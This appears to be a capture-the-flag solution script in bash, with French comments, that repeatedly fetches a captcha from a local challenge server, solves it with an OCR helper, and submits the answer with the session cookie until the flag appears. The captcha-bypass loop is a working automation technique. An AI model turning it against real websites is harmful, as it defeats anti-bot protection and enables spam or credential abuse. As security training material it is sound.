#/bin/bash

HOST="127.0.0.1"
PORT="666"
DEST_IMAGE="/tmp/img_chall_getout.png"
i=0
while true; do
  i=$((i+1))
  # Génération du captcha
  response=$(curl -s -i http://${HOST}:${PORT}/generate-captcha)

  # Extraire le cookie "session_id"
  session_id=$(echo "${response}" | grep -Fi "Set-Cookie" | sed -n 's/Set-Cookie: session_id=\(.*\);.*/\1/p')
  # Extraire le nom de fichier (corps de la réponse)
  file_name=$(echo "${response}" | tail -n 1)

  # Télécharger le captcha généré
  curl -s http://${HOST}:${PORT}/static/captchas/${file_name} -o ${DEST_IMAGE}
  # Executer le script de résolution de captcha
  ocr=$(python3 resolve_captcha.py ${DEST_IMAGE})

  # Soumission du captcha résolu
  result=$(curl -s -X POST http://${HOST}:${PORT}/validate-captcha -b session_id=${session_id} -d captcha=${ocr})
  echo "Test ${i} -> $ocr"
  echo ${result}
  # Stopper la boucle si la chaine "ENI{" (format du flag) est comprise dans la réponse
  if echo "${result}" | grep -q "ENI{"; then
    break
  fi
  rm -f ${DEST_IMAGE}
done
